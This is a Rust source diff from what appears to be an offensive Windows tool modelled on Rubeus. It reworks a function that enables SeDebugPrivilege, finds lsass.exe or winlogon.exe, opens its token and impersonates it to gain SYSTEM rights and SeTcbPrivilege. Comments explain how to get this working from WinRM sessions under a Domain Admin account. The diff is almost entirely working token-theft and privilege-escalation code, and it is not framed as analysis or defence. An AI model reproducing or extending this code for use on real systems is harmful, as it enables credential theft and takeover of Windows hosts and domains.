@@ -67,19 +67,37 @@ pub fn lsa_handle_with_priv() -> Result<(isize, bool)> {
     }
 }
 
-/// Mirror of Rubeus Helpers.GetSystem():
-/// find winlogon.exe, open its token, impersonate directly (no DuplicateTokenEx).
-/// Requires SeDebugPrivilege + SeImpersonatePrivilege.
+/// Impersonate a SYSTEM process token to acquire SeTcbPrivilege.
+///
+/// WinRM sessions run in Session 0: winlogon.exe lives in Session 1 and is
+/// unreachable cross-session without SeTcbPrivilege. We therefore prefer
+/// lsass.exe (Session 0, always SYSTEM) and fall back to winlogon.exe for
+/// interactive/RDP sessions where lsass may be PPL-protected.
+///
+/// Before opening any process we explicitly enable SeDebugPrivilege — the
+/// privilege is present in the token (Domain Admin) but may arrive disabled
+/// in a newly-spawned child process even when `whoami /priv` shows Enabled
+/// in the parent PowerShell runspace.
 #[cfg(windows)]
 unsafe fn impersonate_system_token() -> bool {
     use windows::Win32::System::Diagnostics::ToolHelp::{
         CreateToolhelp32Snapshot, Process32FirstW, Process32NextW,
         PROCESSENTRY32W, TH32CS_SNAPPROCESS,
     };
-    use windows::Win32::System::Threading::{OpenProcess, OpenProcessToken, PROCESS_QUERY_INFORMATION};
-    use windows::Win32::Security::{ImpersonateLoggedOnUser, TOKEN_ALL_ACCESS};
+    use windows::Win32::System::Threading::{
+        GetCurrentProcess, OpenProcess, OpenProcessToken, PROCESS_QUERY_INFORMATION,
+    };
+    use windows::Win32::Security::{
+        AdjustTokenPrivileges, ImpersonateLoggedOnUser, LookupPrivilegeValueW,
+        TOKEN_ACCESS_MASK, TOKEN_ADJUST_PRIVILEGES, TOKEN_ALL_ACCESS, TOKEN_QUERY,
+        TOKEN_PRIVILEGES, LUID_AND_ATTRIBUTES, SE_PRIVILEGE_ENABLED,
+    };
     use windows::Win32::Foundation::CloseHandle;
     use std::mem::zeroed;
+
+    // Explicitly enable SeDebugPrivilege in the current process token.
+    // In WinRM child processes the privilege may be present but disabled.
+    enable_privilege_in_current_process("SeDebugPrivilege");
 
     let Ok(snap) = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0) else {
         return false;
@@ -88,38 +106,70 @@ unsafe fn impersonate_system_token() -> bool {
     let mut entry: PROCESSENTRY32W = zeroed();
     entry.dwSize = std::mem::size_of::<PROCESSENTRY32W>() as u32;
 
-    // Rubeus specifically targets winlogon.exe (Process.GetProcessesByName("winlogon"))
+    // Collect candidate PIDs: prefer lsass (Session 0, same as WinRM),
+    // keep winlogon as fallback (interactive/RDP sessions).
+    let mut lsass_pid = 0u32;
     let mut winlogon_pid = 0u32;
     if Process32FirstW(snap, &mut entry).is_ok() {
         loop {
             let end = entry.szExeFile.iter().position(|&c| c == 0).unwrap_or(260);
             let name = String::from_utf16_lossy(&entry.szExeFile[..end]).to_ascii_lowercase();
-            if name == "winlogon.exe" {
-                winlogon_pid = entry.th32ProcessID;
-                break;
+            match name.as_str() {
+                "lsass.exe"    => lsass_pid    = entry.th32ProcessID,
+                "winlogon.exe" => { if winlogon_pid == 0 { winlogon_pid = entry.th32ProcessID; } }
+                _ => {}
             }
             if Process32NextW(snap, &mut entry).is_err() { break; }
         }
     }
     let _ = CloseHandle(snap);
-    if winlogon_pid == 0 { return false; }
 
-    let Ok(proc) = OpenProcess(PROCESS_QUERY_INFORMATION, false, winlogon_pid) else {
-        return false;
-    };
-
-    // Rubeus: OpenProcessToken with TOKEN_ALL_ACCESS, then ImpersonateLoggedOnUser directly
-    // (no DuplicateTokenEx — passes the primary token straight to impersonation)
-    let mut token: HANDLE = zeroed();
-    if OpenProcessToken(proc, TOKEN_ALL_ACCESS, &mut token).is_err() {
+    // Try each candidate in order
+    for &pid in &[lsass_pid, winlogon_pid] {
+        if pid == 0 { continue; }
+        let Ok(proc) = OpenProcess(PROCESS_QUERY_INFORMATION, false, pid) else { continue; };
+        let mut token: HANDLE = zeroed();
+        let ok = OpenProcessToken(proc, TOKEN_ALL_ACCESS, &mut token).is_ok();
         let _ = CloseHandle(proc);
-        return false;
+        if !ok { continue; }
+        let impersonated = ImpersonateLoggedOnUser(token).is_ok();
+        let _ = CloseHandle(token);
+        if impersonated { return true; }
     }
-    let _ = CloseHandle(proc);
+    false
+}
 
-    let result = ImpersonateLoggedOnUser(token).is_ok();
+/// Enable a named privilege in the current process token via AdjustTokenPrivileges.
+#[cfg(windows)]
+unsafe fn enable_privilege_in_current_process(name: &str) {
+    use windows::Win32::System::Threading::{GetCurrentProcess, OpenProcessToken};
+    use windows::Win32::Security::{
+        AdjustTokenPrivileges, LookupPrivilegeValueW,
+        TOKEN_ADJUST_PRIVILEGES, TOKEN_QUERY,
+        TOKEN_PRIVILEGES, LUID_AND_ATTRIBUTES, SE_PRIVILEGE_ENABLED,
+    };
+    use windows::Win32::Foundation::{CloseHandle, LUID as WinLUID};
+    use std::mem::zeroed;
+
+    let proc = GetCurrentProcess();
+    let mut token: HANDLE = zeroed();
+    if OpenProcessToken(proc, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &mut token).is_err() {
+        return;
+    }
+
+    let name_w: Vec<u16> = name.encode_utf16().chain(std::iter::once(0)).collect();
+    let mut luid: WinLUID = zeroed();
+    if LookupPrivilegeValueW(None, windows::core::PCWSTR(name_w.as_ptr()), &mut luid).is_err() {
+        let _ = CloseHandle(token);
+        return;
+    }
+
+    let tp = TOKEN_PRIVILEGES {
+        PrivilegeCount: 1,
+        Privileges: [LUID_AND_ATTRIBUTES { Luid: luid, Attributes: SE_PRIVILEGE_ENABLED }],
+    };
+    let _ = AdjustTokenPrivileges(token, false, Some(&tp), 0, None, None);
     let _ = CloseHandle(token);
-    result
 }
 
 #[cfg(windows)]
